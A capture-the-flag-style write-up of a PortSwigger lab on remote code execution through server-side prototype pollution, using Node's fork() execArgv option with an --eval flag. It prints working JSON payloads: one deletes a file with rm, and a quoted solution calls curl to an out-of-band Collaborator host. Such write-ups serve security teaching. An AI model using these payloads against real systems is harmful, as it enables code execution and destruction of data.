# Remote code execution via server-side prototype pollution

**Category:** Server-Side Prototype Pollution
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution

Privilege escalation through a polluted `isAdmin` flag is already a serious finding, but it's
still bounded by what the application's own admin panel lets you do. This lab goes further: instead
of polluting a property the application reads, it targets a property Node.js's own
`child_process` module reads when spawning new processes. Get the right property onto
`Object.prototype`, and the next time the server forks a child process, that process inherits
attacker-controlled startup arguments — arbitrary code execution on the box running the
application.

## The Target

The same `change-address` JSON endpoint from earlier labs is the pollution source. The new piece
is an admin-only feature: a "Run maintenance jobs" button that issues `POST /admin/jobs` with a
body like `{"tasks": ["db-cleanup", "fs-cleanup"]}`. Each named task spawns a child process to do
its work — and in this lab, that spawning happens through Node's `child_process.fork()`.

## The Investigation

`fork()` accepts an `options` object, and one of its supported options is `execArgv` — a list of
extra command-line flags passed to the new Node.js process before it runs. If the code calling
`fork()` doesn't explicitly set `execArgv` on every call, an unset `options.execArgv` falls through
to the prototype chain just like any other missing property. That makes it a gadget: pollute
`Object.prototype.execArgv` with a value `fork()` was never meant to receive, and every future
`fork()` call that doesn't override it inherits our value instead.

Node.js supports an `--eval` flag that executes an arbitrary JavaScript string before the forked
module runs at all. Combined with `require('child_process').execSync()` inside that eval string,
that's a path from a polluted array value straight to OS command execution the moment `fork()` is
next called:

```json
{"__proto__": {"execArgv": ["--eval=require('child_process').execSync('COMMAND')"]}}
```

Detection first: as with the two previous labs, we confirmed pollution was live using the
`json spaces` oracle before touching anything destructive. Then we sent the `execArgv` payload to
`change-address` and clicked "Run maintenance jobs." The confirmation signal here was distinctive
rather than a Collaborator callback — one of the two maintenance jobs came back reporting a
failure where it had previously returned success, a direct sign that the forked process was no
longer running with its expected startup arguments. That job-level failure was proof enough that
`execArgv` had taken effect on the `fork()`-based tasks, without needing to wait on any out-of-band
interaction.

## The Exploit

With the gadget confirmed live, we replaced the placeholder command with the lab's actual
objective:

```json
{"__proto__": {"execArgv": ["--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"]}}
```

Sent to `change-address`, then triggered by clicking "Run maintenance jobs" again. The polluted
`execArgv` flowed into the next `fork()` call, the `--eval` flag ran our `execSync()` call before
the forked module's own code ever executed, and `morale.txt` was deleted from `/home/carlos` —
solving the lab.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution reaches the same `execArgv` gadget and the same `--eval` construction, but
confirms RCE differently: after polluting with a curl call pointed at a Collaborator payload
(`"__proto__": {"execArgv":["--eval=require('child_process').execSync('curl
https://YOUR-COLLABORATOR-ID.oastify.com')"]}`), they trigger the maintenance jobs and check the
Collaborator tab for an inbound DNS/HTTP interaction as proof the command ran, before finally
swapping in the destructive `rm` command.

We used a different confirmation signal for the same purpose — a maintenance job switching from
success to failure once `execArgv` was polluted, rather than waiting on an out-of-band callback.
Both are valid proof of the same underlying fact (the forked process picked up our injected
`--eval` flag); Collaborator gives a positive, out-of-band confirmation that the command executed,
while the job-failure signal is an in-band side effect of the same event. The final destructive
payload — `rm /home/carlos/morale.txt` via `execArgv` — is identical between the two approaches.

## What This Teaches Us

This lab is the point where prototype pollution stops being an application-logic bug and becomes
a platform-level one: `execArgv` isn't a property the application defined or cares about at all —
it's an option Node.js's own `child_process` API happens to read from the same shared prototype
chain that the rest of the vulnerable merge logic pollutes. Any code path that eventually spawns
a process, opens a shell, or passes options through to a runtime API is a potential RCE gadget for
server-side prototype pollution, well beyond whatever properties the application's own business
logic happens to check. The fix is unchanged from the rest of this series — keep untrusted JSON
away from a shared, writable prototype chain — but the stakes escalate sharply once a gadget lives
inside a runtime API instead of application code.
